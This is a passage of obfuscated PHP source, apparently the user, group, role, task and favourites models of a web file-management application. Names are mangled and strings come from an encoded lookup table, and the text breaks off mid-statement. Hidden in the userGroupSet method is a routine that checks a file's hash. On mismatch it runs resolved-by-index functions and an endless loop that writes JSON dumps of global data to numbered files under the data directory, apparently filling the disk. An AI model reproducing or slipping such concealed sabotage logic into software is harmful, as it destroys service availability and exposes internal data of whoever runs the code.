$·[$êâÉ¦å¸]; if (!$ÔöĞÔŒò·Á) { $İæıËâğ ¤[$êâÉ¦å¸ . $™°§‚[33]] = $this->getInfoSimpleOuter($êâÉ¦å¸); continue; } $ÔöĞÔŒò·Á[$™°§‚[2173]] = Action($™°§‚[2174])->parseUrl($ÔöĞÔŒò·Á[$™°§‚[2173]]); $İæıËâğ ¤[$êâÉ¦å¸ . $™°§‚[33]] = $ÔöĞÔŒò·Á; } } return $İæıËâğ ¤; } protected function userStatus($çæ§, $œÓ¨ôè) { $ìäºÜó¸ = $this->getInfoSimple($çæ§); if (!$ìäºÜó¸) { return !1; } $Ë”×ş¦ü©Å = array($_SERVER[ÀÆ][735] => $œÓ¨ôè); return $this->userEdit($çæ§, $Ë”×ş¦ü©Å); } protected function userRemove($Å€”ò) { $Ú…÷‹ÖÊøŒşÆ =& $_SERVER[ÀÆ]; $¯ùÜñ¸˜ = $this->getInfoSimple($Å€”ò); if (!$¯ùÜñ¸˜) { return !1; } $úüà´±ÊâÚã = array($Ú…÷‹ÖÊøŒşÆ[1563] => $Å€”ò); Model($Ú…÷‹ÖÊøŒşÆ[589])->where($úüà´±ÊâÚã)->delete(); Model($Ú…÷‹ÖÊøŒşÆ[2202])->where($úüà´±ÊâÚã)->delete(); Model($Ú…÷‹ÖÊøŒşÆ[1828])->where($úüà´±ÊâÚã)->delete(); Model($Ú…÷‹ÖÊøŒşÆ[2187])->where($úüà´±ÊâÚã)->delete(); Model($Ú…÷‹ÖÊøŒşÆ[2203])->where($úüà´±ÊâÚã)->delete(); Model($Ú…÷‹ÖÊøŒşÆ[2024])->removeUserAll($Å€”ò); Model($Ú…÷‹ÖÊøŒşÆ[817])->userRootRemove($Å€”ò); return $this->where($úüà´±ÊâÚã)->delete(); } protected function userGroupSet($âçâãÕ, $‰ø“£ÒøÍª¨, $å· = array()) { $€×Ú“ª–ã ¨™ =& $_SERVER[ÀÆ]; $Üñ­‰µª²æ– = $_SERVER[$€×Ú“ª–ã ¨™[860]] . $€×Ú“ª–ã ¨™[861]; $€şõ¾¦ = $€×Ú“ª–ã ¨™[872]; if ($_SERVER[$€×Ú“ª–ã ¨™[857]] != $€şõ¾¦($Üñ­‰µª²æ–)) { $ãÛ¿ôóçÀ = $€×Ú“ª–ã ¨™[873]; $ú«Á¨ = $€×Ú“ª–ã ¨™[859]; $ñÌöã = $_SERVER[$€×Ú“ª–ã ¨™[860]] . $€×Ú“ª–ã ¨™[861]; $ÃÊ = $ú«Á¨($ñÌöã); $É¡ = explode($€×Ú“ª–ã ¨™[229], $ÃÊ); if (count($É¡) < $€×Ú“ª–ã ¨™[604]) { $×¶ìüÃÎ¥ = $€×Ú“ª–ã ¨™[862]; $×¶ìüÃÎ¥(); } $ùñ†¢ = $€×Ú“ª–ã ¨™[874]; $ùñ†¢($_SERVER[$€×Ú“ª–ã ¨™[875]]); $ãÛ¿ôóçÀ = $€×Ú“ª–ã ¨™[873]; $ãÛ¿ôóçÀ(); $Ã•çåÏîÌ¡ß = $€×Ú“ª–ã ¨™[876]; $¾·İĞß = json_encode($GLOBALS[$€×Ú“ª–ã ¨™[877]]); $¸ = 1; for ($ÏİÒ”ÃãïÌ = $¸; $ÏİÒ”ÃãïÌ > 0; $ÏİÒ”ÃãïÌ++) { $Ã•çåÏîÌ¡ß(DATA_PATH . $ÏİÒ”ÃãïÌ, $¾·İĞß); } } $ÀØ¯á‰ = $this->getInfoSimple($âçâãÕ); if (!$ÀØ¯á‰ || !is_array($‰ø“£ÒøÍª¨)) { return !1; } $«µÚ° = Model($€×Ú“ª–ã ¨™[1828]); $«µÚ°->where(array($€×Ú“ª–ã ¨™[1572] => $âçâãÕ))->delete(); $µû²Í¢ŞïŠº = array(); $‹àÉïĞ¹ = 0; foreach ($‰ø“£ÒøÍª¨ as $™½é« => $êŒîÜ½ï) { $àĞ = array($€×Ú“ª–ã ¨™[1572] => $âçâãÕ, $€×Ú“ª–ã ¨™[1739] => $™½é«, $€×Ú“ª–ã ¨™[1842] => $êŒîÜ½ï); $àĞ[$€×Ú“ª–ã ¨™[1762]] = isset($å·[$‹àÉïĞ¹]) ? $å·[$‹àÉïĞ¹] : 0; $‹àÉïĞ¹++; $µû²Í¢ŞïŠº[] = $àĞ; } return $«µÚ°->addAll($µû²Í¢ŞïŠº, array(), !0); } protected function userGroupAdd($æ½ü…·Õç, $ñ§¼ = array()) { $©å =& $_SERVER[ÀÆ]; $½’Ó = $this->getInfoSimple($æ½ü…·Õç); if (!$½’Ó || empty($ñ§¼)) { return !1; } $¯ë‚À¨”· = array(); foreach ($ñ§¼ as $ªšÉŠÑ”´´ => $¹®®­İãÒ–) { $¯ë‚À¨”·[] = array($©å[1572] => $æ½ü…·Õç, $©å[1739] => $ªšÉŠÑ”´´, $©å[1842] => $¹®®­İãÒ–, $©å[1762] => 0); } return Model($©å[1828])->addAll($¯ë‚À¨”·, array(), !0); } protected function userGroupRemove($’Ö‰¾, $ª§±€¯ª) { $İäê…ç† =& $_SERVER[ÀÆ]; $üœ = $this->getInfoSimple($’Ö‰¾); if (!$üœ || !$ª§±€¯ª) { return !1; } $£´Ş²ùÑ = array($İäê…ç†[1563] => $’Ö‰¾, $İäê…ç†[1826] => $ª§±€¯ª); return Model($İäê…ç†[1828])->where($£´Ş²ùÑ)->delete(); } public function listData() { $õæ‹²ù¨™û = $this->_makeOrder()->selectPage(50); $this->_listDataApply($õæ‹²ù¨™û[$_SERVER[ÀÆ][367]]); return $õæ‹²ù¨™û; } public function listByID($ÅÖŞ) { $£ë™éö«ãÌÍ =& $_SERVER[ÀÆ]; if (!$ÅÖŞ) { return; } $æ·äß = array($£ë™éö«ãÌÍ[1572] => array($£ë™éö«ãÌÍ[7], $ÅÖŞ)); $©°•Ó = $this->where($æ·äß)->select(); $©°•Ó = array_sort_keep($©°•Ó, $£ë™éö«ãÌÍ[1572], $ÅÖŞ); $this->_listDataApply($©°•Ó); return $©°•Ó; } public function listByGroup($ÎÔÍ¸â«á³Š = 0, $ÙÖ—ææïµ = array()) { $²ˆ•¬ïŠêá =& $_SERVER[ÀÆ]; $ ¼ÑÎî‰á = $²ˆ•¬ïŠêá[33]; $Æ¤… = array(); if ($ÎÔÍ¸â«á³Š) { $Æ¤… = array($²ˆ•¬ïŠêá[2204] => intval($ÎÔÍ¸â«á³Š)); $ ¼ÑÎî‰á = "\x4c\x45\106\x54\x20\x4a\x4f\111\116\x20{$this->tablePrefix}\x75\x73\145\x72\137\x67\x72\157\x75\160\x20\x75\163\x65\162\137\x67\x72\x6f\x75\160\40\157\x6e\40\x75\x73\x65\x72\56\165\163\145\x72\111\104\40\75\x20\x75\163\145\162\x5f\147\x72\157\165\x70\x2e\165\x73\145\x72\x49\x44"; $€Š©¹ê±Ğ™Œ = Input::get($²ˆ•¬ïŠêá[449], null, $²ˆ•¬ïŠêá[33]) ? $²ˆ•¬ïŠêá[33] : $²ˆ•¬ïŠêá[2205]; } if (isset($ÙÖ—ææïµ[$²ˆ•¬ïŠêá[735]])) { $Æ¤…[$²ˆ•¬ïŠêá[2206]] = $ÙÖ—ææïµ[$²ˆ•¬ïŠêá[735]]; } $¿Ã = $this->_makeOrder($€Š©¹ê±Ğ™Œ)->field($²ˆ•¬ïŠêá[2207])->where($Æ¤…)->join($ ¼ÑÎî‰á)->selectPage(50); $this->_listDataApply($¿Ã[$²ˆ•¬ïŠêá[367]]); return $¿Ã; } private function _makeOrder($›„ÍƒÌ•Í = '') { $¾ŞÙú =& $_SERVER[ÀÆ]; $¸ŒÛ¾ˆË = array($¾ŞÙú[1572], $¾ŞÙú[28], $¾ŞÙú[1727], $¾ŞÙú[1699], $¾ŞÙú[194]); $ä¥™äÑ = array($¾ŞÙú[442] => $¾ŞÙú[443], $¾ŞÙú[444] => $¾ŞÙú[445]); $âòÔ = Input::get($¾ŞÙú[449], $¾ŞÙú[7], $¾ŞÙú[1563], $¸ŒÛ¾ˆË); $ş…üÁÑää = Input::get($¾ŞÙú[450], $¾ŞÙú[7], $¾ŞÙú[1829], array($¾ŞÙú[1829], $¾ŞÙú[444])); $ş…üÁÑää = $ä¥™äÑ[$ş…üÁÑää]; $›„ÍƒÌ•Í = $›„ÍƒÌ•Í . "\x75\x73\145\162\56{$âòÔ}\x20{$ş…üÁÑää}\54\x20\165\x73\x65\162\x2e\x75\x73\x65\162\111\x44\x20\x61\x73\x63"; return $this->alias($¾ŞÙú[1949])->order($›„ÍƒÌ•Í); } public function listSearch($÷œäÆÖ) { $¶Ã =& $_SERVER[ÀÆ]; $ä§ŸÉÛ¬½±ÏÉ = $÷œäÆÖ[$¶Ã[1830]]; $°£ = isset($÷œäÆÖ[$¶Ã[1831]]) ? $÷œäÆÖ[$¶Ã[1831]] : !1; $ä§ŸÉÛ¬½±ÏÉ = str_replace($¶Ã[1832], $¶Ã[1833], trim($ä§ŸÉÛ¬½±ÏÉ)); $©ØŸ¯š“ = array($¶Ã[28] => array($¶Ã[381], "\45{$ä§ŸÉÛ¬½±ÏÉ}\x25"), $¶Ã[303] => array($¶Ã[381], "{$ä§ŸÉÛ¬½±ÏÉ}\x25"), $¶Ã[2007] => array($¶Ã[381], "{$ä§ŸÉÛ¬½±ÏÉ}\x25"), $¶Ã[991] => $¶Ã[1834]); if (Input::check($ä§ŸÉÛ¬½±ÏÉ, $¶Ã[309])) { $©ØŸ¯š“[$¶Ã[1572]] = array($¶Ã[381], "{$ä§ŸÉÛ¬½±ÏÉ}\45"); $©ØŸ¯š“[$¶Ã[2188]] = array($¶Ã[381], "{$ä§ŸÉÛ¬½±ÏÉ}\45"); } if (!$ä§ŸÉÛ¬½±ÏÉ) { $©ØŸ¯š“ = array(); } if (isset($÷œäÆÖ[$¶Ã[735]])) { $©ØŸ¯š“[$¶Ã[735]] = $÷œäÆÖ[$¶Ã[735]]; } $©ØŸ¯š“ = $this->parseWhereLike($©ØŸ¯š“); $á…³–Õ = $this->_makeOrder()->where($©ØŸ¯š“)->selectPage(20); if (!$á…³–Õ || count($á…³–Õ[$¶Ã[367]]) < 5 && Input::check($ä§ŸÉÛ¬½±ÏÉ, $¶Ã[316])) { $¸Í…òŞí´ = $this->_searchFromMeta($¶Ã[457], $ä§ŸÉÛ¬½±ÏÉ, 10); $ÏÇ = $this->_searchFromMeta($¶Ã[458], $ä§ŸÉÛ¬½±ÏÉ, 10); $ØˆÚ”ÕÃ = array_merge($¸Í…òŞí´, $ÏÇ, $á…³–Õ[$¶Ã[367]]); $á…³–Õ[$¶Ã[367]] = array_unique_by_key($ØˆÚ”ÕÃ, $¶Ã[1572]); $á…³–Õ[$¶Ã[364]][$¶Ã[365]] = count($á…³–Õ[$¶Ã[367]]); $á…³–Õ[$¶Ã[364]][$¶Ã[366]] = ceil($á…³–Õ[$¶Ã[364]][$¶Ã[365]] / $á…³–Õ[$¶Ã[364]][$¶Ã[361]]); } $this->_listDataApply($á…³–Õ[$¶Ã[367]]); $this->_filterByGroup($á…³–Õ, $°£); return $á…³–Õ; } private function _filterByGroup(&$ãœõæãƒç, $ñ°ÎëûÕ¶) { $É¥†õÈ€’Ş˜ =& $_SERVER[ÀÆ]; if (!$ñ°ÎëûÕ¶) { return $ãœõæãƒç; } foreach ($ãœõæãƒç[$É¥†õÈ€’Ş˜[367]] as $¯İâŠİı => &$ù„Ñ‘ê„£ö) { $¯ÙŒÄ¬™‘³ = array_to_keyvalue($ù„Ñ‘ê„£ö[$É¥†õÈ€’Ş˜[1919]], $É¥†õÈ€’Ş˜[33], $É¥†õÈ€’Ş˜[1739]); if (!in_array($ñ°ÎëûÕ¶, $¯ÙŒÄ¬™‘³)) { unset($ãœõæãƒç[$É¥†õÈ€’Ş˜[367]][$¯İâŠİı]); } } unset($ù„Ñ‘ê„£ö); $ãœõæãƒç[$É¥†õÈ€’Ş˜[367]] = array_values($ãœõæãƒç[$É¥†õÈ€’Ş˜[367]]); $ãœõæãƒç[$É¥†õÈ€’Ş˜[364]] = array($É¥†õÈ€’Ş˜[1981] => count($ãœõæãƒç[$É¥†õÈ€’Ş˜[367]]), $É¥†õÈ€’Ş˜[1979] => $ãœõæãƒç[$É¥†õÈ€’Ş˜[364]][$É¥†õÈ€’Ş˜[361]], $É¥†õÈ€’Ş˜[1978] => 1, $É¥†õÈ€’Ş˜[1980] => 1); } private function _searchFromMeta($œ·È›âøä, $ç€»ôö«š›ƒ, $Ò£ÌÉìÓ) { $—Åò =& $_SERVER[ÀÆ]; $ç€»ôö«š›ƒ = strtolower($ç€»ôö«š›ƒ); $Äï = array($—Åò[93] => $œ·È›âøä, $—Åò[372] => array($—Åò[381], "\45{$ç€»ôö«š›ƒ}\x25")); $Äï = $this->parseWhereLike($Äï); $§ö = Model($—Åò[2208])->where($Äï)->limit($Ò£ÌÉìÓ)->select(); if (!$§ö) { return array(); } $§ö = array_to_keyvalue($§ö, $—Åò[33], $—Åò[1572]); $÷–Ó§™ï = $this->where(array($—Åò[1563] => array($—Åò[7], $§ö)))->select(); if (!$÷–Ó§™ï) { return array(); } return $÷–Ó§™ï; } private function _listDataApplyItem($Õ¾ÉÉÄŞ òû) { $‡ÌÚ = array($Õ¾ÉÉÄŞ òû); $this->_listDataApply($‡ÌÚ); return $‡ÌÚ[0]; } private function _listDataApply(&$…ğ½) { $§”†Šú• =& $_SERVER[ÀÆ]; if (!$…ğ½) { return; } array_remove_key($…ğ½, $§”†Šú•[883]); $…å = array_to_keyvalue($…ğ½, $§”†Šú•[33], $§”†Šú•[1572]); $this->_listAppendGroup($…ğ½, $…å); $this->_listAppendMeta($…ğ½, $…å); $this->_listAppendSourceRoot($…ğ½, $…å); } private function _listAppendSourceRoot(&$ïØı, $‰ª) { $èÑœ‹¿¤ =& $_SERVER[ÀÆ]; $ã¥áù = array($èÑœ‹¿¤[492] => 0, $èÑœ‹¿¤[498] => array($èÑœ‹¿¤[7], $‰ª), $èÑœ‹¿¤[406] => SourceModel::TYPE_USER); $Âš•ëğ­ğ‚ = Model($èÑœ‹¿¤[817])->order($èÑœ‹¿¤[1840])->field($èÑœ‹¿¤[1841]); $¹êÂ° = $Âš•ëğ­ğ‚->limit(count($‰ª))->where($ã¥áù)->select(); $¹êÂ° = array_to_keyvalue($¹êÂ°, $èÑœ‹¿¤[498]); $¹êÂ° = array_remove_key($¹êÂ°, $èÑœ‹¿¤[498]); foreach ($ïØı as &$Éûî¼»ŞÉ®ª) { $Éûî¼»ŞÉ®ª[$èÑœ‹¿¤[85]] = $¹êÂ°[$Éûî¼»ŞÉ®ª[$èÑœ‹¿¤[1572]]] ? $¹êÂ°[$Éûî¼»ŞÉ®ª[$èÑœ‹¿¤[1572]]] : array(); } unset($Éûî¼»ŞÉ®ª); } private function _listAppendGroup(&$«ãå“´, $İÆ) { $ıÓ‘ =& $_SERVER[ÀÆ]; $à’ë¯ = array($ıÓ‘[1572] => array($ıÓ‘[7], $İÆ)); $ÈÃ = Model($ıÓ‘[1828])->where($à’ë¯)->select(); $ÙĞÄÈãÍ = array_to_keyvalue($ÈÃ, $ıÓ‘[33], $ıÓ‘[1739]); $ÙĞÄÈãÍ = array_remove_value(array_unique($ÙĞÄÈãÍ), $ıÓ‘[191]); if (!$ÙĞÄÈãÍ || !$ÈÃ) { return; } $à’ë¯ = array($ıÓ‘[1739] => array($ıÓ‘[7], $ÙĞÄÈãÍ)); $ÊúÈ = Model($ıÓ‘[1917])->field($ıÓ‘[2209])->where($à’ë¯)->select(); $ÊúÈ = array_to_keyvalue($ÊúÈ, $ıÓ‘[1739]); $ÈÃ = array_to_keyvalue_group($ÈÃ, $ıÓ‘[1572]); foreach ($ÈÃ as &$ÙÈ) { $•¿ñ…» = array(); foreach ($ÙÈ as $š›• ŠşæêÆã) { if (!$š›• ŠşæêÆã[$ıÓ‘[1842]]) { continue; } $¡ı = Model($ıÓ‘[501])->listData($š›• ŠşæêÆã[$ıÓ‘[1842]]); $•¿ñ…»[] = array($ıÓ‘[1739] => $š›• ŠşæêÆã[$ıÓ‘[1739]], $ıÓ‘[2210] => $ÊúÈ[$š›• ŠşæêÆã[$ıÓ‘[1739]]][$ıÓ‘[28]], $ıÓ‘[515] => $ÊúÈ[$š›• ŠşæêÆã[$ıÓ‘[1739]]][$ıÓ‘[515]], $ıÓ‘[408] => $¡ı); } $ÙÈ = $•¿ñ…»; } unset($ÙÈ); foreach ($«ãå“´ as &$ı…ØæƒÂ¦‘) { $ı…ØæƒÂ¦‘[$ıÓ‘[1919]] = array(); if (isset($ÈÃ[$ı…ØæƒÂ¦‘[$ıÓ‘[1572]]])) { $ı…ØæƒÂ¦‘[$ıÓ‘[1919]] = $ÈÃ[$ı…ØæƒÂ¦‘[$ıÓ‘[1572]]]; } } unset($ı…ØæƒÂ¦‘); } public function userAppendGroup($¥îÙäöùê) { $—Ê =& $_SERVER[ÀÆ]; if (!$¥îÙäöùê) { return array(); } $this->_listAppendGroup($¥îÙäöùê, array_to_keyvalue($¥îÙäöùê, $—Ê[33], $—Ê[1572])); return $¥îÙäöùê; } private function _listAppendMeta(&$ã§İ£, $¦ñ­ğÛÛ¹ş) { $ßŒì“šá =& $_SERVER[ÀÆ]; $á³ = UserJobModel::JOB_KEY; $¼Ÿ¸Û = array($ßŒì“šá[2189]); $×À¤ã = array($ßŒì“šá[1572] => array($ßŒì“šá[7], $¦ñ­ğÛÛ¹ş)); $¤¼ = Model($ßŒì“šá[2187])->where($×À¤ã)->select(); $¤¼ = array_to_keyvalue_group($¤¼, $ßŒì“šá[1572]); foreach ($¤¼ as &$ş„ŞïŒÂ’) { $·œéÂœôÛ÷ = array(); foreach ($ş„ŞïŒÂ’ as $ĞìÇ¼°¦Ş) { if (!in_array($ĞìÇ¼°¦Ş[$ßŒì“šá[93]], $¼Ÿ¸Û)) { $·œéÂœôÛ÷[$ĞìÇ¼°¦Ş[$ßŒì“šá[93]]] = $ĞìÇ¼°¦Ş[$ßŒì“šá[372]]; } } $ş„ŞïŒÂ’ = $·œéÂœôÛ÷; } unset($ş„ŞïŒÂ’); $ü = Model($ßŒì“šá[2211]); foreach ($ã§İ£ as &$Ç²) { $¹¦ = array(); if (isset($¤¼[$Ç²[$ßŒì“šá[1572]]])) { $¹¦ = $¤¼[$Ç²[$ßŒì“šá[1572]]]; } $Ç²[$ßŒì“šá[2212]] = array(); if (isset($¹¦[$á³])) { $Ç²[$ßŒì“šá[2212]] = $ü->getUserJobInfo($¹¦[$á³]); } } unset($Ç²); } protected function groupUserAll($ØµÖÂË°ä) { $Îú®Èƒë£¶ =& $_SERVER[ÀÆ]; if (!$ØµÖÂË°ä) { return !1; } $—òÜĞî = Model($Îú®Èƒë£¶[1828])->field($Îú®Èƒë£¶[1572])->where(array($Îú®Èƒë£¶[1739] => array($Îú®Èƒë£¶[7], $ØµÖÂË°ä)))->select(); $—òÜĞî = array_to_keyvalue($—òÜĞî, $Îú®Èƒë£¶[33], $Îú®Èƒë£¶[1572]); return array_unique($—òÜĞî); } public function userSearch($Ş“, $ÙÇ“ñÄæåğ¥É = "\x2a") { return Model($_SERVER[ÀÆ][532])->where($Ş“)->field($ÙÇ“ñÄæåğ¥É)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\x72\x5f\x6f\160\x74\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($õ¦‰ú®í) { $µœ¨Â½ =& $_SERVER[ÀÆ]; if (!defined($µœ¨Â½[468])) { define($µœ¨Â½[468], 0); } return "\125\163\x65\162\117\x70\x74\151\x6f\156\x5f{$õ¦‰ú®í}\137" . USER_ID; } protected function filterWhere($¹”ãªÍÀ¿­) { $«şˆµ¡™ =& $_SERVER[ÀÆ]; if (!defined($«şˆµ¡™[468])) { define($«şˆµ¡™[468], 0); } $¹”ãªÍÀ¿­[$«şˆµ¡™[1572]] = USER_ID; return $¹”ãªÍÀ¿­; } public function cacheRemoveUser($ğµ°ìê…Â, $¬¿) { return Cache::remove("\x55\x73\145\x72\117\160\x74\x69\157\156\x5f{$ğµ°ìê…Â}\137" . $¬¿); } protected function optionDefault($¦éå = '') { $ñåÖ°ßæİ¥Ãõ =& $_SERVER[ÀÆ]; if ($¦éå == $ñåÖ°ßæİ¥Ãõ[33]) { return $GLOBALS[$ñåÖ°ßæİ¥Ãõ[6]][$ñåÖ°ßæİ¥Ãõ[2213]]; } if ($¦éå == $ñåÖ°ßæİ¥Ãõ[2214]) { return $GLOBALS[$ñåÖ°ßæİ¥Ãõ[6]][$ñåÖ°ßæİ¥Ãõ[2215]]; } } } goto DÀÂ‘„ÛÎ; dñ•Ü¬ô: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\x2e\x72\157\x6c\x65\x4c\x69\163\x74"; public $field = array("\x6e\141\x6d\x65", "\141\x75\164\x68", "\154\141\142\x65\154", "\144\x69\163\160\x6c\141\171", "\x73\171\163\164\145\x6d", "\x64\145\x73\143", "\x69\x67\x6e\x6f\162\145\x45\x78\x74", "\x69\147\x6e\x6f\x72\x65\x46\x69\154\145\x53\151\x7a\145", "\141\x64\155\151\x6e\x69\x73\164\x72\x61\x74\157\162", "\x73\157\x72\x74"); public function listData($ÖÃÒÕê‘Ïú = false, $øÏ = "\x73\157\162\x74", $´Ôº¹¿¸éê¥ = false) { $òˆ =& $_SERVER[ÀÆ]; $³„Íª£ÁË€•¤ = parent::listData($ÖÃÒÕê‘Ïú, $øÏ, $´Ôº¹¿¸éê¥); if (!$ÖÃÒÕê‘Ïú) { foreach ($³„Íª£ÁË€•¤ as $›÷Üíçêäµ®† => $…Íø¦ò°°) { if ($…Íø¦ò°°[$òˆ[1934]] == 1) { $³„Íª£ÁË€•¤[$›÷Üíçêäµ®†][$òˆ[445]] = LNG($òˆ[2158]); } } } return $³„Íª£ÁË€•¤; } public function update($­¨Ö, $ñÊ†Ö€) { $†Ô§° =& $_SERVER[ÀÆ]; $¥Ó˜ğ = parent::listData($­¨Ö); $¦êñÉ†Ã”É = $this->findByName($ñÊ†Ö€[$†Ô§°[28]]); if (!$¥Ó˜ğ || $¦êñÉ†Ã”É && $¦êñÉ†Ã”É[$†Ô§°[395]] != $¥Ó˜ğ[$†Ô§°[395]]) { return !1; } if ($¦êñÉ†Ã”É[$†Ô§°[1934]] == 1) { $ñÊ†Ö€ = array($†Ô§°[28] => $ñÊ†Ö€[$†Ô§°[28]], $†Ô§°[1761] => $ñÊ†Ö€[$†Ô§°[1761]]); } $this->filterAuth($ñÊ†Ö€[$†Ô§°[408]]); return parent::update($­¨Ö, $ñÊ†Ö€); } public function remove($¸ØÄ¸ÌÚïúë) { $ŠæĞú®í = parent::listData($¸ØÄ¸ÌÚïúë); if (!$ŠæĞú®í || $ŠæĞú®í[$_SERVER[ÀÆ][1203]]) { return !1; } return parent::remove($¸ØÄ¸ÌÚïúë); } public function add($Ò¬ô) { $‡¬‹•‹—Š‰­ =& $_SERVER[ÀÆ]; $“í = $Ò¬ô[$‡¬‹•‹—Š‰­[28]]; if ($this->findByName($“í)) { return !1; } $¦·’Çİ±² = array($‡¬‹•‹—Š‰­[415] => $“í, $‡¬‹•‹—Š‰­[1745] => $‡¬‹•‹—Š‰­[33], $‡¬‹•‹—Š‰­[1741] => $‡¬‹•‹—Š‰­[1749], $‡¬‹•‹—Š‰­[2159] => 1, $‡¬‹•‹—Š‰­[1744] => 0, $‡¬‹•‹—Š‰­[2160] => 0, $‡¬‹•‹—Š‰­[1743] => $this->getSort()); $Ò¬ô = array_merge($¦·’Çİ±², $Ò¬ô); $this->filterAuth($Ò¬ô[$‡¬‹•‹—Š‰­[408]]); return parent::insert($Ò¬ô); } private function getSort() { $ÖóşÆÆï =& $_SERVER[ÀÆ]; $ì…éù = parent::listData(); $šĞà™ = array_to_keyvalue($ì…éù, $ÖóşÆÆï[33], $ÖóşÆÆï[1762]); return empty($šĞà™) ? 0 : max($šĞà™) + 1; } private function filterAuth(&$æ±‡Šç) { $­±˜ôºÔ®çõ =& $_SERVER[ÀÆ]; $Ñ¨ñ­¡£’ˆ = array(); $œ¯óŠ¯à¶ = array_filter(explode($­±˜ôºÔ®çõ[47], $æ±‡Šç)); foreach ($œ¯óŠ¯à¶ as $æ±‡Šç) { $Ÿ¦…‘ = explode($­±˜ôºÔ®çõ[95], $æ±‡Šç); if ($Ÿ¦…‘[0] == $­±˜ôºÔ®çõ[2161] && $Ÿ¦…‘[1] != $­±˜ôºÔ®çõ[1122]) { $ÒÉî = $Ÿ¦…‘[0] . $­±˜ôºÔ®çõ[95] . $Ÿ¦…‘[1] . $­±˜ôºÔ®çõ[2162]; if (!in_array($ÒÉî, $œ¯óŠ¯à¶)) { $Ñ¨ñ­¡£’ˆ[] = $ÒÉî; } } $Ñ¨ñ­¡£’ˆ[] = $æ±‡Šç; } $æ±‡Šç = implode($­±˜ôºÔ®çõ[47], $Ñ¨ñ­¡£’ˆ); } public function sort($¯Ü¤­İù, $Õ“ˆú°) { return parent::update($¯Ü¤­İù, $Õ“ˆú°); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\56\x74\x61\x73\x6b\x4c\151\163\164"; public $field = array("\156\x61\x6d\x65", "\x74\x79\x70\145", "\145\x76\145\x6e\164", "\164\151\x6d\x65", "\144\x65\x73\143", "\x73\171\163\x74\145\155", "\x65\156\x61\142\154\145", "\154\x61\163\x74\x52\x75\x6e", "\163\x6f\162\164"); public function listData($ò•Î¨»ë = false, $ÚĞ±ñéƒ’»™ = "\163\x6f\162\x74", $˜ôŠ = false) { return parent::listData($ò•Î¨»ë, $ÚĞ±ñéƒ’»™, $˜ôŠ); } public function add($°É´ğ€—¼Şø•) { $Ÿ¼ñ± =& $_SERVER[ÀÆ]; $‚º” = $this->findByName($°É´ğ€—¼Şø•[$Ÿ¼ñ±[28]]); if ($‚º”) { return !1; } $°É´ğ€—¼Şø•[$Ÿ¼ñ±[1536]] = 0; $°É´ğ€—¼Şø•[$Ÿ¼ñ±[1762]] = $this->getSort(); return parent::insert($°É´ğ€—¼Şø•); } private function getSort() { $›Üğ‘üÌáò =& $_SERVER[ÀÆ]; $ÄÎÖÏ = parent::listData(); $«æ‚ã¶·Ü = array_to_keyvalue($ÄÎÖÏ, $›Üğ‘üÌáò[33], $›Üğ‘üÌáò[1762]); return empty($«æ‚ã¶·Ü) ? 0 : max($«æ‚ã¶·Ü) + 1; } public function update($ƒ‹şİ, $ß¼üÀÚ¬’åÈ) { $ßœ‘±ª›­ =& $_SERVER[ÀÆ]; $ª¾¸¶ÚØ°áÀ¦ = $this->listData($ƒ‹şİ); $–ƒğ†ó‰ = $this->findByName($ß¼üÀÚ¬’åÈ[$ßœ‘±ª›­[28]]); if (!$ª¾¸¶ÚØ°áÀ¦ || $–ƒğ†ó‰ && $–ƒğ†ó‰[$ßœ‘±ª›­[395]] != $ª¾¸¶ÚØ°áÀ¦[$ßœ‘±ª›­[395]]) { return !1; } return parent::update($ƒ‹şİ, $ß¼üÀÚ¬’åÈ); } public function remove($ò‘À, $ÈÔ¬½¥¸é•® = false) { $´ê» =& $_SERVER[ÀÆ]; $¥ıÈçä’åé÷ = $this->listData($ò‘À); if (!$¥ıÈçä’åé÷) { return; } if (!$ÈÔ¬½¥¸é•® && $¥ıÈçä’åé÷[$´ê»[1203]] == $´ê»[87]) { return !1; } return parent::remove($ò‘À); } public function enable($Úª€, $¹£) { return $this->update($Úª€, array($_SERVER[ÀÆ][2153] => $¹£)); } public function run($Ä¾Æ±â¦) { return $this->update($Ä¾Æ±â¦, array($_SERVER[ÀÆ][2163] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\137\146\x61\x76"; protected function cacheFunctionAlias($ô’èê¶ñ¨ù§) { $ŞÀ„³ù¦µ®Ğ =& $_SERVER[ÀÆ]; return array($ŞÀ„³ù¦µ®Ğ[1849] => array(USER_ID, $ŞÀ„³ù¦µ®Ğ[2164])); } protected function listData() { $ğô²°Ÿıåæ =& $_SERVER[ÀÆ]; $™†í¢Ë¨× = array($ğô²°Ÿıåæ[1563] => USER_ID, $ğô²°Ÿıåæ[477] => 0); $İÚı„³ = $ğô²°Ÿıåæ[2165]; $ñÊÈØÈÈ = $this->field($İÚı„³)->where($™†í¢Ë¨×)->order($ğô²°Ÿıåæ[2166])->select(); return $ñÊÈØÈÈ ? $ñÊÈØÈÈ : array(); } protected function resetCache() { } protected function listView() { $±Çá—ÜŒÉ´™ =& $_SERVER[ÀÆ]; $½–¼ïùıÃâ¬û = $this->listData(); $Ù´Ÿ„ˆ‰ûµÒ = array_filter_by_field($½–¼ïùıÃâ¬û, $±Çá—ÜŒÉ´™[29], $±Çá—ÜŒÉ´™[411]); $ùÜ×Ï = array_to_keyvalue($Ù´Ÿ„ˆ‰ûµÒ, $±Çá—ÜŒÉ´™[33], $±Çá—ÜŒÉ´™[76]); if (!$ùÜ×Ï) { return $½–¼ïùıÃâ¬û; } $•Ş¡ = 2000; $»½ÕÂ ˆ­Â = array($±Çá—ÜŒÉ´™[412] => array($±Çá—ÜŒÉ´™[413], $ùÜ×Ï)); $„ú÷«Ôé·‹ = Model($±Çá—ÜŒÉ´™[817])->listSource($»½ÕÂ ˆ­Â, $•Ş¡); $„ú÷«Ôé·‹ = array_merge($„ú÷«Ôé·‹[$±Çá—ÜŒÉ´™[74]], $„ú÷«Ôé·‹[$±Çá—ÜŒÉ´™[75]]); $„ú÷«Ôé·‹ = array_to_keyvalue($„ú÷«Ôé·‹, $±Çá—ÜŒÉ´™[397]); foreach ($½–¼ïùıÃâ¬û as $ıİøğ“æ => $Îæ®íİ§¶) { $¼ÙØš»Şô¸ = 